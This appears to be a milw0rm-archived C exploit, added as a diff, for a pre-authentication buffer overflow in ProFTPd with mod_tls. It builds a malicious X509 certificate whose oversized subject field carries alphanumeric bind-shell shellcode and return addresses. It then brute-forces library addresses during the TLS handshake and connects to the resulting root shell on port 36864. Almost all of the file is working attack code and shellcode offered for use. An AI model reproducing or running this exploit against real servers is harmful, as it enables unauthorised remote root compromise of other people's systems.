@@ -1,0 +1,440 @@
+/* 
+ *	*** Anti-modTLS-0day version 2 ***
+ *
+ * ProFTPd *.*.* + mod_tls remote-root-0day-exploit
+ * 
+ * main advantages of this exploit:
+ *	1) No patched mod_tls versions yet
+ *	2) This is a preauthentication bug
+ *	3) Bruteforcing option (eheheheee)
+ * main disadvantages:
+ *	2) Target mechanism isn't very well, cause exploitation
+ *	   depends on library mapped address, so, there are no
+ *	   strict categories.
+ *	1) Dunno, if there are a lot of proftpd+mod_tls boxes
+ *	   outta there.
+ *
+ * Bug found by: netris
+ * exploit written by: netris 
+ *
+ * -- ADD --
+ *
+ * Hi there. Here goes the original exploit written in 2004 
+ * (not in 2006 like some of you would guess), and found by
+ * netris, not Evgeny Legerov. Big middle fingers to those
+ * who fight for commercial security shit system. 
+ * Greets to arpunk, pandzilla, c0dak, mcb, c0de, ^sq, disque,
+ * gamma, djang0 and many others of ex #phenoelit channel.
+ * 
+ * netris.
+ *
+ * mailto: netris_spam@ok.kz
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <getopt.h>
+#include <netdb.h>
+#include <openssl/ssl.h>
+#include <openssl/ssl3.h>
+#include <openssl/x509.h>
+#include <openssl/err.h>
+
+#define CODE_SZ 2322
+#define DPORT 21
+
+#define BSET(u,a,b,c,d) u = a*0x1000000;\
+			u+= b*0x0010000;\
+			u+= c*0x0000100;\
+			u+= d*0x0000001;
+
+#define checkz(a) int i;\
+		  for(i=0;i<4;i++){\
+		  	if(a[i]<0x20)a[i]=0x20;\
+			if(a[i]>0x7f)a[i]=0x7f;\
+		  }
+
+int ch,timeout=2,br=0;
+ struct ADDR{
+ 	char *os;
+        unsigned long call_reg; /* eax or edx */
+};
+
+/*bindshell, port 36864, offset 265, buf address is edx */
+char shellcode[]="h22ImX522ImHRWPPSRPPaVUWWTBfRJfhdEfXf5YDfPDfh0PDTY09RUajWY"
+		 "0Loa0toafhoXfYf1LocjxY0Loe0Toe0ToffhH0fYf1Loh0tojjFY0Lok0t"
+		 "ok0tolfht9fXf1Don0TopjyX0Dor0TosjKX0Dou0Tov0ToxjIX0Doy0Toy"
+		 "G0tozGGfhsCfYf1LozGG0tozGGjZY0LozGGjkX0Doz0TozGGjGX0Doz0To"
+		 "zG0tozGGjAY0LozGf1tozGGG0tozGGjpY0LozG0tozGGjpY0LozG0TozGG"
+		 "jfX0DozG0tozGGjRX0DozG0tozGG0TozGj8Y0Loz0tozG0TozGfhlGfYf1"
+		 "LozGGGG0TozGG0TozGj3Y0Loz0tozG0tozGGjuX0DozG0TozGGjyY0LozG"
+		 "0tozGGG0tozGj4Y0Loz0tozG0TozGjqX0Doz0tozG0tozGfhyCfXf1DozG"
+		 "Gf1tozGGjFY0Loz0TozG0TozGjQY0LozGG0tozGj9Y0Loz0TozG0TozGjY"
+		 "X0DozGG0tozGjFX0Doz0TozG0tozGGjnY0LozG0TozGGjTY0LozG0tozGj"
+		 "gY0Loz0TozG0tozGGj4Y0LozG0TozGj9X0DozG0tozGfhKofYf1Lozf1to"
+		 "zGG0tozGfha5fXf1Dozf1TozGGj4X0Doz0TozGjYY0LozGGGGjHY0LozCn"
+		 "1qGvFXpvzvFxyvFqrNCOf26C9FcSwFR1T1jvFYOofvFfrNdvNjrNZOf2Gv"
+		 "2KCCOf2LvVyvViOfC2KyMOFj629OnA2FOfA29wVivvXxkrK8O224xra54v"
+		 "bingsh";
+
+X509 *Create_Death_Certificate(EVP_PKEY **pkey);
+void set_subject(X509 *cert, X509_NAME *subject, X509_NAME *issuer);
+void DUF_add_entry(X509_NAME **subiss, char *field, 
+			unsigned char *bytes, int len);
+void setaddr(char *hname, struct sockaddr_in *sap, int port);
+void senddata(int sock, char *data);                            
+int shell(char *host,int port, struct sockaddr_in ad);
+void help(char *prname);
+
+SSL_CTX *ctx;
+SSL *conn;
+int sk;
+
+void handler(){
+	if(!conn->in_handshake){
+		SSL_shutdown(conn);
+		SSL_free(conn);
+	}
+	close(sk);
+	exit(0);
+}
+
+void step(char *str, int err){
+	static i;
+	if(br)
+		return;
+	switch(err){
+		case 0:
+			fprintf(stderr,"[%03d] %s\n",i+1,str);
+			i++;break;
+		case -1:
+			fprintf(stderr,"[!!!] %s\n",str);
+			break;
+		case 1:
+			fprintf(stderr,"[!!!] %s\n\t",str);
+			ERR_print_errors_fp(stderr);
+	}
+}
+/* Add targets here */
+struct ADDR vict[]={
+	{"Bruteforce mode",0x40202020},
+	{"Gentoo Linux 1.4 3.2.3-r1 - openssl-0.9.7d",0x40235727},
+	{"Gentoo Linux 1.4.3.2.3-r1 - default install",0x40283a43},	
+	{0}
+};
+
+int main(int argc, char *argv[])
+{
+	int port=DPORT,aa[4];
+	char *host,*sport,opt;
+	unsigned long saddr=0;
+	struct sockaddr_in a;
+
+	EVP_PKEY *key;
+	X509 *cert=NULL;
+
+	fprintf(stderr,"--< rebel-proftpd-modtls-0day\n");
+	fprintf(stderr,"--< netris @ duffsrebelz\n\n");
+	
+	while((opt=getopt(argc,(void*)argv,"+b:t:x"))!=-1)
+		switch(opt){
+			case 't':timeout=atoi(optarg);break;
+			case 'b':sscanf(optarg,"0x%x",&saddr);break;
+			case 'x':ch=1;
+				X509_print_fp(stderr,
+					Create_Death_Certificate(&key));
+				exit(0);
+			default:help(argv[0]);
+		}
+	if(argc-optind!=2)
+		help(argv[0]);
+	
+	ch=atoi(argv[optind]);
+	
+	if(host=strchr(argv[optind+1],':')){
+		if(!isdigit(*(host+1))){
+			step("weird arguments\n",-1);
+			exit(-1);
+		}
+		host = strtok(argv[optind+1],":");
+		sport = strtok(NULL,":");
+		port=atoi(sport);
+	}else
+		host=argv[optind+1];
+	
+	(ch==0)?(br=1):(br=0);
+	
+	SSL_library_init();	
+	if(br)
+		fprintf(stderr,
+			"--< Ready, Steady, GO!!! >:O\n\n");
+	setaddr(host,&a,port);
+
+	if(!saddr)saddr=vict[0].call_reg;
+	
+	aa[3] = (saddr >>  0) & 0xff;
+	aa[2] = (saddr >>  8) & 0xff;
+	aa[1] = (saddr >> 16) & 0xff;
+	aa[0] = (saddr >> 24) & 0xff;
+	
+	checkz(aa);
+	
+	for(;;){
+	for(;aa[1]<0x7e;aa[1]++){
+		for(;aa[2]<0x7e;aa[2]++){
+			for(;aa[3]<0x7e;aa[3]++){
+	BSET(vict[0].call_reg,aa[0],aa[1],aa[2],aa[3]);
+	fprintf(stderr,"[0x%08x]\n",vict[0].call_reg);
+	sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);		
+	
+	cert = Create_Death_Certificate(&key);
+	a.sin_port=htons(port);
+	a.sin_family=AF_INET;
+	if((connect(sk,(struct sockaddr*)&a,sizeof(a)))<0){
+		fprintf(stderr,"[!!!] couldn't connect\n\n");
+		close(sk);
+		exit(-1);
+	}
+	
+	senddata(sk,"AUTH TLS\n");
+	
+	ctx  = SSL_CTX_new(SSLv23_client_method());
+	SSL_CTX_use_certificate(ctx, cert);
+	SSL_CTX_use_PrivateKey(ctx, key);
+
+	conn = SSL_new(ctx);
+	SSL_set_connect_state(conn);
+	SSL_set_fd(conn,sk);
+	signal(SIGINT,handler);
+	step("establishing SSL connection",0);
+#ifdef DEBUG
+	getc(stdin);
+#endif
+	if(SSL_connect(conn)<0){
+		fprintf(stderr,"[!!!] No SSL enabled on %s\n\n",host);
+		exit(-1);
+	}
+	step("shell spawn...",0);
+	if(shell(host,36864,a))
+		exit(0);
+	
+	step("done, see ya later\n",0);
+	X509_free(cert);
+	if(!conn->in_handshake){
+		SSL_shutdown(conn);
+		SSL_free(conn);
+	}						
+	}aa[3]=0x20;
+	}aa[2]=0x20;
+	}aa[1]=0x20;
+	}
+	return 0;
+}
+
+X509 *Create_Death_Certificate(EVP_PKEY **key)
+{
+	FILE *fd;
+	time_t t;
+
+	X509_NAME *subject=NULL;
+	X509_NAME *issuer=NULL;
+	ASN1_TIME *tbefore,*tafter;
+	ASN1_INTEGER *serial;
+	X509 *dz; /* certificate */
+	RSA *rsa;
+	EVP_PKEY *pk;
+	
+	step("preparing dirty certificate",0);
+
+  	dz = X509_new();
+	
+	/* private-key generation */
+  	pk = EVP_PKEY_new();
+  	rsa = RSA_generate_key(1024, RSA_F4, NULL,NULL); 
+  	EVP_PKEY_assign_RSA(pk,rsa);
+	X509_set_pubkey(dz,pk);
+	
+	/* version/serial */
+  	X509_set_version(dz,0x2); /* version: 3 */
+	serial = ASN1_INTEGER_new();
+  	ASN1_INTEGER_set(serial,0x01);
+	X509_set_serialNumber(dz, serial); 
+		
+	/* not-before/notafter validity */
+	tbefore = ASN1_TIME_new();
+	tafter = ASN1_TIME_new();
+	ASN1_TIME_set(tbefore,t=0);
+	ASN1_TIME_set(tafter,t=60*60*24*366*65);
+  	X509_set_notBefore(dz, tbefore);
+  	X509_set_notAfter(dz, tafter);   
+	
+	/* DN Subject/Issuer */
+	set_subject(dz,subject,issuer);
+
+	/* let's make it self signed */
+	X509_sign(dz, pk, EVP_md5());
+	
+	*key=pk;
+	X509_NAME_free(subject);
+	ASN1_INTEGER_free(serial);
+	ASN1_TIME_free(tbefore);
+	ASN1_TIME_free(tafter);
+	close(fd);
+	return dz;
+}
+
+/* <soletario> yeah man */ 
+void set_subject(X509 *cert, X509_NAME *subject, X509_NAME *issuer)
+{
+	int i;
+	char dc0de[6000];
+	
+	memset(dc0de,0,sizeof(dc0de));
+		
+	for(i=0; i<5000-1; i++)
+		dc0de[i]='E';
+	for(i=258; i<258+sizeof(shellcode)-1; i++)
+		dc0de[i]=shellcode[i-258];
+	i+=1;
+	for(; i<3200; i+=4){ /* uhh, rude */
+		dc0de[i+0]=(vict[ch].call_reg >> 0) & 0xff;
+		dc0de[i+1]=(vict[ch].call_reg >> 8) & 0xff;
+		dc0de[i+2]=(vict[ch].call_reg >>16) & 0xff;
+		dc0de[i+3]=(vict[ch].call_reg >>24) & 0xff;
+	}
+	subject = X509_get_subject_name(cert);
+	issuer = X509_get_issuer_name(cert);	
+	
+	DUF_add_entry(&subject,"host",dc0de,-1);
+
+	X509_set_subject_name(cert,subject);
+	X509_NAME_delete_entry(issuer,0);
+	X509_set_issuer_name(cert,issuer);
+}
+
+/* This function can insert large fields */
+void DUF_add_entry(X509_NAME **subiss, char *field, 
+			unsigned char *bytes, int len)
+{
+	ASN1_OBJECT *obj;
+	X509_NAME_ENTRY *ne;
+	
+	ne=X509_NAME_ENTRY_new();	
+	obj=OBJ_txt2obj(field,0);
+	X509_NAME_ENTRY_set_object(ne,obj);
+	ASN1_mbstring_ncopy(&ne->value,bytes,len,MBSTRING_ASC,0,0,0);	
+	X509_NAME_add_entry(*subiss,ne,-1,0);
+}
+
+void setaddr(char *hname, struct sockaddr_in *sap, int port)
+{
+	struct hostent *hp;
+
+	memset(sap,0,sizeof(*sap));
+	sap->sin_family = AF_INET;
+
+	if(!inet_aton(hname,&sap->sin_addr)){
+		hp = gethostbyname(hname);
+		if(hp == NULL){
+			step("unkown host",-1);
+			return;
+		}
+		sap->sin_addr = *(struct in_addr *)hp->h_addr;
+	}else
+		sap->sin_addr.s_addr = inet_addr(hname);
+	
+	sap->sin_port = htons(port);
+}
+
+int shell(char *host, int port, struct sockaddr_in ad)
+{
+	u_char buf[4096];
+    	fd_set fds;
+	int sock;
+	struct sockaddr_in a=ad;
+	
+	sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
+	
+	a.sin_family = AF_INET;
+	a.sin_port = htons(port);
+
+	if((connect(sock,(struct sockaddr*)&a,sizeof(a)))<0){
+			 step("couldn't connect\n",-1);
+			 close(sock);
+			 if(!br)
+			 	handler();
+			 else return 0;
+	}
+	signal(SIGINT,SIG_IGN);
+	fprintf(stderr,"\n--< %s just has been 0wned\n\n",host);	
+        for (;;){
+		FD_ZERO(&fds);
+		FD_SET(0, &fds);
+		FD_SET(sock, &fds);
+		fprintf(stderr,"\033[31m[duffshell]#\033[0m ");
+		select(255, &fds, NULL, NULL, NULL);
+		memset(buf, 0, sizeof(buf));
+		
+		if (FD_ISSET(sock, &fds)){
+			read(sock, buf, sizeof(buf));
+			fprintf(stderr, "%s", buf);
+		}
+		if (FD_ISSET(0, &fds)){
+			read(0, buf, sizeof(buf));
+			if(strstr(buf,"exit")){
+				fprintf(stderr,"\n");
+				return 1;
+			}
+			write(sock, buf, strlen(buf));        
+		}    
+	}
+}
+
+void senddata(int sock, char *data)
+{
+	int i,c=0,j;
+	char au[4];
+	fd_set ff;
+	struct timeval tm;
+	int r;
+	
+	FD_ZERO(&ff);
+	FD_SET(sock,&ff);
+	tm.tv_sec = timeout;
+	tm.tv_usec = 30;
+	memset(au,0,4);
+	
+	if(data){
+		j=0;
+			send(sock,data,strlen(data),0);
+		for(;;){
+			if(!(r=select(sock+1,&ff,NULL,NULL,&tm)))
+				break;
+			if((i=read(sock,&c,1))<=0)
+				break;
+		}
+	}
+}
+
+void help(char *prname)
+{
+	int i=0;
+	fprintf(stderr,"usage: %s target hostname:[port]\n",prname);
+	fprintf(stderr,"   -t <delay>     :delay of data send/recv\n");
+	fprintf(stderr,"   -b <addr>      :bruteforce starting address\n");
+	fprintf(stderr,"   -x             :just the payload certificate and exit\n");
+	fprintf(stderr,"current targets:\n");
+	for(i=0;vict[i].call_reg;i++)
+		fprintf(stderr,"   %d) %s ( %08x )\n",i,
+					     vict[i].os,
+					     vict[i].call_reg);
+	putc('\n',stderr);
+	exit(-1);
+}
+
+// milw0rm.com [2007-08-24]
